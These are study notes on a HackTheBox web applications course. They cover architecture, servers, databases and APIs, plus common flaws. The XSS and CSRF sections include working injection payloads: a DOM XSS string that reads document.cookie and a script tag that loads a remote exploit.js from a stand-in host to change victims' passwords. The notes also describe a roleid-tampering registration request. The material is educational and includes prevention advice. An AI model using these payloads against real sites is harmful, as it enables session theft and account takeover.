# Introduction to Web Applications
Brief notes written to review the material in the HackTheBox module, Introduction to Web Applications.

Web applications are interactive applications that run on web browsers. Web applications usually adopt a client-server architecture to run and handle interactions. They typically have front end components (i.e., the website interface, or "what the user sees") that run on the client-side (browser) and other back end components (web application source code) that run on the server-side (back end server/databases). Some examples of typical web applications include online email services like Gmail, online retailers like Amazon, and online word processors like Google Docs.

### Web Applications vs. Websites
In the past, we interacted with websites that are static and cannot be changed in real-time. This means that traditional websites were statically created to represent specific information, and this information would not change with our interaction. To change the website's content, the corresponding page has to be edited by the developers manually. These types of static pages do not contain functions and, therefore, do not produce real-time changes. That type of website is also known as Web 1.0. On the other hand, most websites run web applications, or Web 2.0 presenting dynamic content based on user interaction. Another significant difference is that web applications are fully functional and can perform various functionalities for the end-user, while web sites lack this type of functionality. Other key differences between traditional websites and web applications include:

- Being modular
- Running on any display size
- Running on any platform without being optimized

### Web Applications vs. Native Operating System Applications
Unlike native operating system (native OS) applications, web applications are platform-independent and can run in a browser on any operating system. These web applications do not have to be installed on a user's system because these web applications and their functionality are executed remotely on the remote server and hence do not consume any space on the end user's hard drive. Another advantage of web applications over native OS applications is version unity. All users accessing a web application use the same version and the same web application, which can be continuously updated and modified without pushing updates to each user.

On the other hand, native OS applications have certain advantages over web applications, mainly their operation speed and the ability to utilize native operating system libraries and local hardware. As native applications are built to utilize native OS libraries, they are much faster to load and interact with.

### Web Application Distribution
- WordPress (Open Source)
- OpenCart (Open Source)
- Joomla (Open Source)
- Wix (Closed Source)
- Shopify (Closed Source)
- DotNetNuke (Closed Source)

### Attacking Web Apps

|Flaw|	Real-world Scenario|
|:-:|:-:|
|SQL injection|	Obtaining Active Directory usernames and performing a password spraying attack against a VPN or email portal.
|File Inclusion|	Reading source code to find a hidden page or directory which exposes additional functionality that can be used to gain remote code execution.
|Unrestricted File Upload|	A web application that allows a user to upload a profile picture that allows any file type to be uploaded (not just images). This can be leveraged to gain full control of the web application server by uploading malicious code.
|Insecure Direct Object Referencing (IDOR)|	When combined with a flaw such as broken access control, this can often be used to access another user's files or functionality. An example would be editing your user profile browsing to a page such as /user/701/edit-profile. If we can change the 701 to 702, we may edit another user's profile!
|Broken Access Control|	Another example is an application that allows a user to register a new account. If the account registration functionality is designed poorly, a user may perform privilege escalation when registering. Consider the POST request when registering a new user, which submits the data username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3. What if we can manipulate the roleid parameter and change it to 0 or 1. We have seen real-world applications where this was the case, and it was possible to quickly register an admin user and access many unintended features of the web application.

# Web Application Layout
Web application layouts consist of many different layers that can be summarized with the following three main categories:

|Category|	Description|
|:-:|:-:|
|Web Application Infrastructure|	Describes the structure of required components, such as the database, needed for the web application to function as intended. Since the web application can be set up to run on a separate server, it is essential to know which database server it needs to access.
|Web Application Components|	The components that make up a web application represent all the components that the web application interacts with. These are divided into the following three areas: UI/UX, Client, and Server components.
|Web Application Architecture|	Architecture comprises all the relationships between the various web application components.

## Web Application Infrastructure
Web applications can use many different infrastructure setups. These are also called models. The most common ones can be grouped into the following four types:

- Client-Server
- One Server
- Many Servers - One Database
- Many Servers - Many Databases

### Client Server
A server hosts the web application in a client-server model and distributes it to any clients trying to access it. In this model, web applications have two types of components, those in the front end, which are usually interpreted and executed on the client-side (browser), and components in the back end, usually compiled, interpreted, and executed by the hosting server. Once the user clicks on a button or requests a specific function, the browser sends an HTTP web request to the server, which interprets this request and performs the necessary task(s) to complete the request (i.e., logging the user in, adding an item to the shopping cart, browsing to another page, etc.). Once the server has the required data, it sends the result back to the client's browser, displaying the result in a human-readable way.

### One Server
The entire web application or even several web applications and their components, including the database, are hosted on a single server. Though this design is straightforward and easy to implement, it is also the riskiest design. Furthermore, if the webserver goes down for any reason, all hosted web applications become entirely inaccessible until the issue is resolved.

### Many Servers - One Database
This model separates the database onto its own database server and allows the web applications' hosting server to access the database server to store and retrieve data. It can be seen as many-servers to one-database and one-server to one-database, as long as the database is separated on its own database server. The web applications can be replications of one main application (i.e., primary/backup), or they can be separate web applications that share common data. This model's main advantage (from a security point of view) is segmentation.

### Many Servers - Many Databases
This model builds upon the Many Servers, One Database model. However, within the database server, each web application's data is hosted in a separate database. The web application can only access private data and only common data that is shared across web applications. This design is also widely used for redundancy purposes, so if any web server or database goes offline, a backup will run in its place to reduce downtime as much as possible. Although this may be more difficult to implement and may require tools like load balancers to function appropriately, this architecture is one of the best choices in terms of security due to its proper access control measures and proper asset segmentation.

Aside from these models, there are other web application models available such as serverless web applications or web applications that utilize microservices.

## Web Application Components
1. Client
2. Server
- Webserver
- Web Application Logic
- Database
3. Services (Microservices)
- 3rd Party Integrations
- Web Application Integrations
5. Functions (Serverless)

## Web Application Architecture
Three Tier Architecture:

|Layer	|Description|
|:-:|:-:|
|Presentation Layer|	Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS.
|Application Layer|	This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.
|Data Layer|	The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.

An example of a web application architecture could look something like this:
<img width="1378" height="749" alt="image" src="https://github.com/user-attachments/assets/2b1a57cb-16f5-4653-ba0b-4f3bd59f4703" />

### Microservices
We can think of microservices as independent components of the web application, which in most cases are programmed for one task only. For example, for an online store, we can decompose core tasks into the following components:

- Registration
- Search
- Payments
- Ratings
- Reviews

The communication between these microservices is stateless, which means that the request and response are independent. This is because the stored data is stored separately from the respective microservices. The use of microservices is considered service-oriented architecture (SOA), built as a collection of different automated functions focused on a single business goal.

### Serverless
Cloud providers such as AWS, GCP, Azure, among others, offer serverless architectures. These platforms provide application frameworks to build such web applications without having to worry about the servers themselves. These web applications then run in stateless computing containers (Docker, for example). This type of architecture gives a company the flexibility to build and deploy applications and services without having to manage infrastructure; all server management is done by the cloud provider.

# Front End vs. Back End
## Front End
The front end of a web application contains the user's components directly through their web browser (client-side). These components make up the source code of the web page we view when visiting a web application and usually include HTML, CSS, and JavaScript. In modern web applications, front end components should adapt to any screen size and work within any browser on any device. This contrasts with back end components, which are usually written for a specific platform or operating system. If the front end of a web application is not well optimized, it may make the entire web application slow and unresponsive.

Aside from frontend code development, the following are some of the other tasks related to front end web application development:

- Visual Concept Web Design
- User Interface (UI) design
- User Experience (UX) design

## Back End
The back end of a web application drives all of the core web application functionalities, all of which is executed at the back end server, which processes everything required for the web application to run correctly. It is the part we may never see or directly interact with.

There are four main back end components for web applications:
|Component	|Description|
|:-:|:-:|
|Back end Servers|	The hardware and operating system that hosts all other components and are usually run on operating systems like Linux, Windows, or using Containers.
|Web Servers|	Web servers handle HTTP requests and connections. Some examples are Apache, NGINX, and IIS.
|Databases|	Databases (DBs) store and retrieve the web application data. Some examples of relational databases are MySQL, MSSQL, Oracle, PostgreSQL, while examples of non-relational databases include NoSQL and MongoDB.
|Development Frameworks|	Development Frameworks are used to develop the core Web Application. Some well-known frameworks include Laravel (PHP), ASP.NET (C#), Spring (Java), Django (Python), and Express (NodeJS JavaScript).

It is also possible to host each component of the back end on its own isolated server, or in isolated containers, by utilizing services such as Docker. To maintain logical separation and mitigate the impact of vulnerabilities, different components of the web application, such as the database, can be installed in one Docker container, while the main web application is installed in another, thereby isolating each part from potential vulnerabilities that may affect the other container(s).

Some of the main jobs performed by back end components include:

- Develop the main logic and services of the back end of the web application
- Develop the main code and functionalities of the web application
- Develop and maintain the back end database
- Develop and implement libraries to be used by the web application
- Implement technical/business needs for the web application
- Implement the main APIs for front end component communications
- Integrate remote servers and cloud services into the web application

# Front-End Components
# HTML

HTML is the core of any web page we see on the internet. It contains each page's basic elements, including titles, forms, images, and many other elements. The web browser, in turn, interprets these elements and displays them to the end-user.

HTML elements are displayed in a tree form:
```
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```
## URL Encoding
For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL.

Some common character encodings are:

|Character|	Encoding|
|:-:|:-:|
|space|	%20
|!|	%21
|"|	%22
|#|	%23
|$|	%24
|%|	%25
|&|	%26
|'|	%27
|(|	%28
|)|	%29


## Usage
The <head> element usually contains elements that are not directly printed on the page, like the page title, while all main page elements are located under <body>. Other important elements include the <style>, which holds the page's CSS code, and the <script>, which holds the JS code of the page.

Each of these elements is called a DOM (Document Object Model). The World Wide Web Consortium (W3C) defines DOM as:

"The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."

The DOM standard is separated into 3 parts:

- Core DOM - the standard model for all document types
- XML DOM - the standard model for XML documents
- HTML DOM - the standard model for HTML documents

# CSS
CSS (Cascading Style Sheets) is the stylesheet language used alongside HTML to format and set the style of HTML elements.

CSS defines the style of each HTML element or class between curly brackets {}, within which the properties are defined with their values (i.e. element { property : value; }).

Each HTML element has many properties that can be set through CSS, such as height, position, border, margin, padding, color, text-align, font-size, and hundreds of other properties.

### Usage
CSS is often used alongside JavaScript to make quick calculations, dynamically adjust the style properties of certain HTML elements, or achieve advanced animations based on keystrokes or the mouse cursor location. Furthermore, CSS can be used alongside other languages to implement their styles, like XML or within SVG items, and can also be used in modern mobile development platforms to design entire mobile application User Interfaces (UI).

## Frameworks
Many CSS frameworks have been introduced, which contain a collection of CSS style-sheets and designs, to make it much faster and easier to create beautiful HTML elements. These frameworks are optimized for web application usage. They are designed to be used with JavaScript and for wide use within a web application and contain elements usually required within modern web applications. Some of the most common CSS frameworks are:

- Bootstrap
- SASS
- Foundation
- Bulma
- Pure

# Javascript
JavaScript is usually used on the front end of an application to be executed within a browser. Still, there are implementations of back end JavaScript used to develop entire web applications, like NodeJS.

While HTML and CSS are mainly in charge of how a web page looks, JavaScript is usually used to control any functionality that the front end web page requires. Without JavaScript, a web page would be mostly static and would not have much functionality or interactive elements.

### Example
Within the page source code, JavaScript code is loaded with the <script> tag, as follows:
```
<script type="text/javascript">
..JavaScript code..
</script>

ALSO

<script src="./script.js"></script>

AND ALSO

document.getElementById("button1").innerHTML = "Changed Text!";
```
### Usage
Most common web applications heavily rely on JavaScript to drive all needed functionality on the web page.
JavaScript is also used to automate complex processes and perform HTTP requests to interact with the back end components and send and retrieve data, through technologies like Ajax.

All modern web browsers are equipped with JavaScript engines that can execute JavaScript code on the client-side without relying on the back end webserver to update the page. This makes using JavaScript a very fast way to achieve a large number of processes quickly.

In addition to automation, JavaScript is also often used alongside CSS, to drive advanced animations that would not be possible with CSS alone.
## Frameworks
As web applications become more advanced, it may be inefficient to use pure JavaScript to develop an entire web application from scratch. This is why a host of JavaScript frameworks have been introduced to improve the experience of web application development.

These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and use of dynamically changing HTML code, instead of using static HTML code.

These platforms either use JavaScript as their programming language or use an implementation of JavaScript that compiles its code into JavaScript code.

Some of the most common front end JavaScript frameworks are:

- Angular
- React
- Vue
- jQuery

# Sensitive Data Exposure
All of the information covered so far are front end components that interact with the client-side. If they are attacked, they do not pose a direct threat to the core back end of the web application and usually will not lead to permanent damage. However, as these components are executed on the client-side, they put the end-user in danger of being attacked and exploited if they do have any vulnerabilities. If a front end vulnerability is leveraged to attack admin users, it could result in unauthorized access, access to sensitive data, service disruption, and more.

Sensitive Data Exposure refers to the availability of sensitive data in clear-text to the end-user. This is usually found in the source code of the web page or page source on the front end of web applications.

Sometimes we may find login credentials, hashes, exposed links, directories, or even exposed user information data hidden in the comments and source code of a web page or within external JavaScript code being imported.

### Prevention
Ideally, the front end source code should only contain the code necessary to run all of the web applications functions, without any extra code or comments that are not necessary for the web application to function properly. It is always important to review the code that will be visible to end-users through the page source or run it through tools to check for exposed information. Developers should also review client-side code to ensure that no unnecessary comments or hidden links are left behind. Furthermore, front end developers may want to use JavaScript code packing or obfuscation to reduce the chances of exposing sensitive data through JavaScript code. These techniques may prevent automated tools from locating these types of data.

# HTML Injection
User input validation and sanitization is carried out on the back end. However, some user input would never make it to the back end in some cases and is completely processed and rendered on the front end. Therefore, it is critical to validate and sanitize user input on both the front end and the back end.

HTML injection occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through JavaScript on the front end.

This may include a malicious HTML code, like an external login form, which can be used to trick users into logging in while actually sending their login credentials to a malicious server to be collected for other attacks.

Another example of HTML Injection is web page defacing. This consists of injecting new HTML code to change the web page's appearance, inserting malicious ads, and causing reputational damage.

To test for HTML Injection, we can simply input a small snippet of HTML code as our name, and see if it is displayed as part of the page. We will test the following code, which changes the background image of the web page:
```
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```

As everything is being carried out on the front end, refreshing the web page would reset everything back to normal.

# Cross-Site Scripting (XSS)
HTML Injection vulnerabilities can often be utilized to also perform Cross-Site Scripting (XSS) attacks by injecting JavaScript code to be executed on the client-side. Once we can execute code on the victim's machine, we can potentially gain access to the victim's account or even their machine.

There are three main types of XSS:

|Type|	Description|
|:-:|:-:|
|Reflected XSS|	Occurs when user input is displayed on the page after processing (e.g., search result or error message).
|Stored XSS|	Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
|DOM XSS|	Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).

We can try to inject the following DOM XSS JavaScript code as a payload, which should show us the cookie value for the current user:
```
#"><img src=/ onerror=alert(document.cookie)>
```
Once we input our payload and hit ok, we see that an alert window pops up with the cookie value in it:
<img width="809" height="113" alt="image" src="https://github.com/user-attachments/assets/c261225a-f8c7-463d-8a92-6747e575645b" />

This payload is accessing the HTML document tree and retrieving the cookie object's value. When the browser processes our input, it will be considered a new DOM, and our JavaScript will be executed, displaying the cookie value back to us in a popup.

An attacker can leverage this to steal cookie sessions and send them to themselves and attempt to use the cookie value to authenticate to the victim's account.

# Cross-Site Request Forgery (CSRF)
The third type of front end vulnerability that is caused by unfiltered user input is Cross-Site Request Forgery (CSRF). CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user.

A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim's logged-in session to change their password.

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application).

Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:

```
"><script src=//www.example.com/exploit.js></script>
```

The exploit.js file would contain the malicious JavaScript code that changes the user's password. Developing the exploit.js in this case requires knowledge of this web application's password changing procedure and APIs.

### Prevention
It is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

|Type|	Description|
|:-:|:-:|
|Sanitization|	Removing special characters and non-standard characters from user input before displaying it or storing it.
|Validation|	Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like HTML Injection and XSS. Another solution would be to implement a web application firewall (WAF), which can help prevent injection attempts automatically.
But WAF solutions can potentially be bypassed, so developers should follow coding best practices and not rely on an appliance to detect/block attacks.

Most modern web applications include anti-CSRF mechanisms, such as requiring a unique token for each session or request. Additionally, HTTP-level defenses like the SameSite cookie attribute (SameSite=Strict or Lax) can restrict browsers from including authentication cookies in cross-origin requests.

# Back End Servers
The back end server would fit in the Data access layer.

The back end server contains the other 3 back end components:

- Web Server
- Database
- Development Framework

Other software components on the back end server may include hypervisors, containers, and WAFs.

There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components:

|Combinations|	Components|
|:-:|:-:|
|LAMP	|Linux, Apache, MySQL, and PHP.
|WAMP|	Windows, Apache, MySQL, and PHP.
|WINS	|Windows, IIS, .NET, and SQL Server
|MAMP|	macOS, Apache, MySQL, and PHP.
|XAMPP	|Cross-Platform, Apache, MySQL, and PHP/PERL.

# Web Servers
A web server is an application that runs on the back end server, which handles all of the HTTP traffic from the client-side browser, routes it to the requested pages, and finally responds to the client-side browser.
A typical web server accepts HTTP requests from the client-side, and responds with different HTTP responses and codes, like a code 200 OK response for a successful request, a code 404 NOT FOUND when requesting pages that do not exist, code 403 FORBIDDEN for requesting access to restricted pages, and so on.

Web servers usually run on TCP ports 80 or 443.

Web servers also accept various types of user input within HTTP requests, including text, JSON, and even binary data (i.e., for file uploads). Once a web server receives a web request, it is then responsible for routing it to its destination, run any processes needed for that request, and return the response to the user on the client-side.

### Apache
Apache 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.

Apache is usually used with PHP for web application development, but it also supports other languages like .Net, Python, Perl, and even OS languages like Bash through CGI.

Apache is an open-source project, and community users can access its source code to fix issues and look for vulnerabilities. It is well-maintained and regularly patched against vulnerabilities to keep it safe against exploitation.

### NGINX
NGINX is the second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes NGINX a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using NGINX.

### IIS
IIS (Internet Information Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers. IIS is usually used to host web applications developed for the Microsoft .NET framework, but can also be used to host web applications developed in other languages like PHP, or host other types of services like FTP.

IIS is very well optimized for Active Directory integration and includes features like Windows Auth for authenticating users using Active Directory, allowing them to automatically sign in to web applications.

# Databases
Web applications utilize back end databases to store various content and information related to the web application. This can be core web application assets like images and files, web application content like posts and updates, or user data like usernames and passwords.

If not securely coded, database code can lead to a variety of issues, like SQL Injection vulnerabilities.

### Relational (SQL)
Relational (SQL) databases store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.
A table can have more than one key, as another column can be used as a key to link with another table. The relationship between tables within a database is called a Schema.

By using relational databases, it becomes very quick and easy to retrieve all data about a certain element from all databases. For example, we can retrieve all details linked to a certain user from all tables with a single query. This makes relational databases very fast and reliable for big datasets that have a clear structure and design.

Some of the most common relational databases include:

|Type|	Description|
|:-:|:-:|
|MySQL|	The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
|MSSQL	|Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers
|Oracle|	A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses
|PostgreSQL|	Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design

### Non-relational (NoSQL)
A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.
Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.

There are 4 common storage models for NoSQL databases:

- Key-Value: usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value
- Document-Based: stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.
- Wide-Column
- Graph

Some of the most common NoSQL databases include:

|Type|	Description|
|:-:|:-:|
|MongoDB|	The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects
|ElasticSearch|	Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient
|Apache Cassandra|	Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values

# Development Frameworks & APIs
There are many common web development frameworks that help in developing core web application files and functionality. With the increased complexity of web applications, it may be challenging to create a modern and sophisticated web application from scratch. Hence, most of the popular web applications are developed using web frameworks.

Popular websites usually utilize a variety of frameworks and web servers, rather than just one.

Some of the most common web development frameworks include:

- Laravel (PHP): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
- Express (Node.JS): used by PayPal, Yahoo, Uber, IBM, and MySpace.
- Django (Python): used by Google, YouTube, Instagram, Mozilla, and Pinterest.
- Rails (Ruby): used by GitHub, Hulu, Twitch, Airbnb, and even Twitter in the past.

## APIs
An important aspect of back end web application development is the use of Web APIs and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.

For the front end component to interact with the back end and ask for certain tasks to be carried out, they utilize APIs to ask the back end component for a specific task with specific input. The back end components process these requests, perform the necessary functions, and return a certain response to the front end components, which finally renderers the end user's output on the client-side.

### Query Parameters
The default method of sending specific arguments to a web page is through GET and POST request parameters. 

For example, a /search.php page would take an item parameter, which may be used to specify the search item. Passing a parameter through a GET request is done through the URL '/search.php?item=apples', while POST parameters are passed through POST data at the bottom of the POST HTTP request.

Query parameters allow a single page to receive various types of input, each of which can be processed differently. For certain other scenarios, Web APIs may be much quicker and more efficient to use.

## Web APIs
An API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the HTTP protocol and are usually handled and translated through web servers.

Example: Twitter's API, which allows us to retrieve the latest Tweets from a certain account in XML or JSON formats, and even allows us to send a Tweet 'if authenticated'.

To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like SOAP or REST.

### SOAP
The SOAP (Simple Objects Access) standard shares data through XML, where the request is made in XML through an HTTP request, and the response is also returned in XML. Front end components are designed to parse this XML output properly.

SOAP is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing stateful objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.

### REST

The REST (Representational State Transfer) standard shares data through the URL path 'i.e. search/users/1', and usually returns the output in JSON format 'i.e. userid 1'. Other output formats for REST include XML, x-www-form-urlencoded, or even raw data.

Unlike Query Parameters, REST APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. This is usually useful for queries like search, sort, or filter. This is why REST APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.

REST uses various HTTP methods to perform different actions on the web application:

- GET request to retrieve data
- POST request to create data (non-idempotent)
- PUT request to create or replace existing data (idempotent)
- DELETE request to remove data

# Common Web Vulnerabilities
## Broken Authentication/Access Control
Broken authentication and Broken Access Control are among the most common and most dangerous vulnerabilities for web applications.

Broken Authentication refers to vulnerabilities that allow attackers to bypass authentication functions. For example, this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.

Broken Access Control refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example, a normal user gaining access to the admin panel.

## Malicious File Upload
Another common way to gain control over web applications is through uploading malicious scripts. If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a PHP script), which will allow us to execute commands on the remote server.

## Command Injection
Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called command injection.

This vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.

## SQL Injection (SQLi)
Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input. If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server. 

# Public Vulnerabilities
## Public CVE
As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE (Common Vulnerabilities and Exposures) record and score.

Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications.

Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like Exploit DB, Rapid7 DB, or Vulnerability Lab.

We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to Remote Code Execution. Other types of public exploits should also be considered if none of the above is available.

Furthermore, these vulnerabilities are not exclusive to web applications and apply to components utilized by the web application. If a web application uses external components (e.g., a plugin), we should also search for vulnerabilities for these external components.

## Common Vulnerability Scoring System (CVSS)
The Common Vulnerability Scoring System (CVSS) is an open-source industry standard for assessing the severity of security vulnerabilities. This scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems' vulnerabilities. This helps with the prioritization of resources and the response to a given threat.

CVSS scores are based on a formula that uses several metrics: Base, Temporal, and Environmental. When calculating the severity of a vulnerability using CVSS, the Base metrics produce a score ranging from 0 to 10, modified by applying Temporal and Environmental metrics. The National Vulnerability Database (NVD) provides CVSS scores for almost all known, publicly disclosed vulnerabilities. At this time, the NVD only provides Base scores based upon a given vulnerability's inherent characteristics. The current scoring systems in place are CVSS v2 and CVSS v3. There are several differences between the v2 and v3 systems, namely changes to the Base and Environmental groups to account for additional metrics.

CVSS scoring ratings differ slightly between V2 and V3 as can be seen in the following tables:

CVSS V2.0 Ratings:

|Severity	Base| Score Range|
|:-:|:-:|
|Low|	0.0-3.9
|Medium|	4.0-6.9
|High|	7.0-10.0

CVSS V3.0 Ratings:

|Severity	Base| Score Range|
|:-:|:-:|
|None|	0.0
|Low|	0.1-3.9
|Medium|	4.0-6.9
|High|	7.0-8.9
|Critical|	9.0-10.0
